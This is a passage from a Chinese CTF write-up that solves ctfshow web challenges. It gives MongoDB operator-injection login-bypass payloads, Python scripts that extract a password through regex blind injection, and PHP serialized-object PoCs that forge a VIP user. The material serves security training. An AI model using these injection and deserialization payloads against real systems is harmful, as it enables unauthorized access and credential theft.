</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">      
</span></span></code></pre></div><p>这题有很多不同的username</p>
<p>我们可以考虑采用正则匹配来筛选</p>
<pre tabindex="0"><code>username[$ne]=1&amp;password[$regex]=ctfshow{
</code></pre><p>or</p>
<p>用$gt （大于）一直尝试知道拿到有flag的用户</p>
<pre tabindex="0"><code>username[$ne]=admin&amp;password[$ne]=1
username[$gt]=admin1&amp;password[$ne]=1
username[$gt]=admin2&amp;password[$ne]=1
username[$gt]=admin3&amp;password[$ne]=1
</code></pre><p>or</p>
<p>正则匹配去掉所有为admin开头的用户</p>
<pre tabindex="0"><code>username[$regex]=^[^admin].*$&amp;password[$ne]=1
</code></pre><h4 id="web253">web253<a hidden class="anchor" aria-hidden="true" href="#web253">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//sql
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nx">db</span><span class="o">.</span><span class="nx">ctfshow_user</span><span class="o">.</span><span class="nx">find</span><span class="p">({</span><span class="nx">username</span><span class="o">:</span><span class="s1">&#39;$username&#39;</span><span class="p">,</span><span class="nx">password</span><span class="o">:</span><span class="s1">&#39;$password&#39;</span><span class="p">})</span><span class="o">.</span><span class="nx">pretty</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><h5 id="方法一-1">方法一<a hidden class="anchor" aria-hidden="true" href="#方法一-1">#</a></h5>
<p><a href="https://www.cnblogs.com/recharging-runtime/p/15077477.html">CTFSHOW WEB入门 SQL注入篇 - b477eRy - 博客园</a></p>
<p>猜测到id为flag，直接布尔盲注拿到flag</p>
<pre tabindex="0"><code>import string

import requests

url = &#34;http://5ce4ea0d-afb5-4f1c-9e65-626bdaa6e433.challenge.ctf.show:8080/api/&#34;

letters = &#34;{}-_&#34; + string.ascii_lowercase + string.digits


def valid_pass(password: str) -&gt; bool:
    data = {
        &#34;username[$regex]&#34;: &#34;flag&#34;,
        &#34;password[$regex]&#34;: f&#34;{password}.*&#34;
    }
    response = requests.post(url, data=data)
    return &#34;登陆成功&#34; in response.json()[&#34;msg&#34;]


result = &#34;&#34;

while True:
    for letter in letters:
        if valid_pass(result + letter):
            result += letter
            print(f&#34;[*] result: {result}&#34;)
            break
</code></pre><h5 id="方法二">方法二<a hidden class="anchor" aria-hidden="true" href="#方法二">#</a></h5>
<pre tabindex="0"><code>import requests, time, json


def brute(action, username=&#34;&#34;):
    url = &#34;http://44e163eb-3f69-4641-83b2-5499d9c0d5ed.challenge.ctf.show/api/&#34;
    if action == &#34;username&#34;:
        res = &#34;^[^a]&#34;  # admin1的password为ctfshow666...很明显不是flag，所以禁掉admin开头的用户
    else:
        res = &#34;^ctfshow{&#34;
    for j in range(30):
        flag = False
        for i in range(127):
            reg = res
            if chr(i) not in &#34;0123456789abcdefghijklmnopqrstuvwxyz-{}:,_&#34;:
                continue
            n = chr(i)
            if chr(i) in &#34;-{}:&#34;:
                n = &#34;\\&#34;+chr(i)
            print(chr(i))
            if action == &#34;username&#34;:
                data = {&#34;username[$regex]&#34;: f&#34;{reg+n}&#34;, &#34;password[$ne]&#34;: f&#34;1&#34;}
            else:
                data = {&#34;username[$regex]&#34;: f&#34;{username}$&#34;, &#34;password[$regex]&#34;: f&#34;{reg+n}&#34;}
            while True:
                try:
                    r = requests.post(url, data=data, timeout=7)
                    break
                except TimeoutError:
                    time.sleep(0.1)
                except KeyboardInterrupt:
                    exit(0)
            try:
                resp = json.loads(r.text)
            except:
                resp = None
                continue
            if resp[&#34;msg&#34;] == &#34;\u767b\u9646\u6210\u529f&#34;:
                res += chr(i)
                flag = True
                break
        if not flag:
            break
        print(res)
    return res


if __name__ == &#39;__main__&#39;:
    username = brute(&#34;username&#34;)
    print(f&#34;用户名为: {username}&#34;)
    password = brute(&#34;password&#34;, username)
    print(f&#34;用户名: {username}\n密码: {password}&#34;)
</code></pre><h3 id="反序列化">反序列化<a hidden class="anchor" aria-hidden="true" href="#反序列化">#</a></h3>
<h4 id="php的魔法方法">PHP的魔法方法<a hidden class="anchor" aria-hidden="true" href="#php的魔法方法">#</a></h4>
<p>PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-scss" data-lang="scss"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nt">__construct</span><span class="o">()</span><span class="err">，</span><span class="nt">类的构造函数</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nt">__destruct</span><span class="o">()</span><span class="err">，</span><span class="nt">类的析构函数</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nt">__call</span><span class="o">()</span><span class="err">，</span><span class="nt">在对象中调用一个不可访问方法时调用</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nt">__callStatic</span><span class="o">()</span><span class="err">，</span><span class="nt">用静态方式中调用一个不可访问方法时调用</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nt">__get</span><span class="o">()</span><span class="err">，</span><span class="nt">获得一个类的成员变量时调用</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nt">__set</span><span class="o">()</span><span class="err">，</span><span class="nt">设置一个类的成员变量时调用</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nt">__isset</span><span class="o">()</span><span class="err">，</span><span class="nt">当对不可访问属性调用isset</span><span class="o">()</span><span class="nt">或empty</span><span class="o">()</span><span class="nt">时调用</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nt">__unset</span><span class="o">()</span><span class="err">，</span><span class="nt">当对不可访问属性调用unset</span><span class="o">()</span><span class="nt">时被调用</span><span class="err">。</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nt">__sleep</span><span class="o">()</span><span class="err">，</span><span class="nt">执行serialize</span><span class="o">()</span><span class="nt">时</span><span class="err">，</span><span class="nt">先会调用这个函数</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nt">__wakeup</span><span class="o">()</span><span class="err">，</span><span class="nt">执行unserialize</span><span class="o">()</span><span class="nt">时</span><span class="err">，</span><span class="nt">先会调用这个函数</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nt">__toString</span><span class="o">()</span><span class="err">，</span><span class="nt">类被当成字符串时的回应方法</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nt">__invoke</span><span class="o">()</span><span class="err">，</span><span class="nt">调用函数的方式调用一个对象时的回应方法</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="nt">__set_state</span><span class="o">()</span><span class="err">，</span><span class="nt">调用var_export</span><span class="o">()</span><span class="nt">导出类时</span><span class="err">，</span><span class="nt">此静态方法会被调用</span><span class="err">。</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="nt">__clone</span><span class="o">()</span><span class="err">，</span><span class="nt">当对象复制完成时调用</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="nt">__autoload</span><span class="o">()</span><span class="err">，</span><span class="nt">尝试加载未定义的类</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="nt">__debugInfo</span><span class="o">()</span><span class="err">，</span><span class="nt">打印所需调试信息</span>
</span></span></code></pre></div><h4 id="web254">web254<a hidden class="anchor" aria-hidden="true" href="#web254">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-02 17:44:47
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-02 19:29:02
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">class</span> <span class="nc">ctfShowUser</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">checkVip</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$u</span><span class="o">&amp;&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="o">=</span><span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">vipOneKeyGetFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;your flag is &#34;</span><span class="o">.</span><span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;no vip, no flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="nv">$username</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="nv">$password</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">
</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfShowUser</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">login</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">checkVip</span><span class="p">()){</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">            <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">vipOneKeyGetFlag</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;no vip,no flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>看着很长，实际上审一下代码发现账号和密码已经放出来了</p>
<pre tabindex="0"><code>    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
</code></pre><p>poc</p>
<pre tabindex="0"><code>/?username=xxxxxx&amp;password=xxxxxx
</code></pre><h4 id="web255">web255<a hidden class="anchor" aria-hidden="true" href="#web255">#</a></h4>
<p>相比上一题只是把</p>
<pre tabindex="0"><code>$user = new ctfShowUser();
</code></pre><p>改为了</p>
<pre tabindex="0"><code>$user = unserialize($_COOKIE[&#39;user&#39;]);
</code></pre><p>区别不大只需要通过反序列化的方式实例化ctfShowUser()即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfShowUser</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="o">=</span><span class="k">true</span><span class="p">;</span> <span class="c1">//不能漏
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
</span></span></code></pre></div><p>传参拿到flag</p>
<h4 id="web256">web256<a hidden class="anchor" aria-hidden="true" href="#web256">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-02 17:44:47
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-02 19:29:02
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">class</span> <span class="nc">ctfShowUser</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">checkVip</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$u</span><span class="o">&amp;&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">vipOneKeyGetFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">!==</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">                    <span class="k">echo</span> <span class="s2">&#34;your flag is &#34;</span><span class="o">.</span><span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">              <span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;no vip, no flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="nv">$username</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="nv">$password</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">
</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]);</span>    
</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">login</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">checkVip</span><span class="p">()){</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">            <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">vipOneKeyGetFlag</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;no vip,no flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>相比上一道题多了个</p>
<pre tabindex="0"><code>$this-&gt;username!==$this-&gt;password
</code></pre><p>区别不大</p>
<p>poc</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfShowUser</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">isVip</span><span class="o">=</span><span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s2">&#34;okok&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
</span></span></code></pre></div><p>传参拿到flag</p>
<h4 id="web257">web257<a hidden class="anchor" aria-hidden="true" href="#web257">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-02 17:44:47
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-02 20:33:07
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">class</span> <span class="nc">ctfShowUser</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">private</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">private</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">private</span> <span class="nv">$class</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
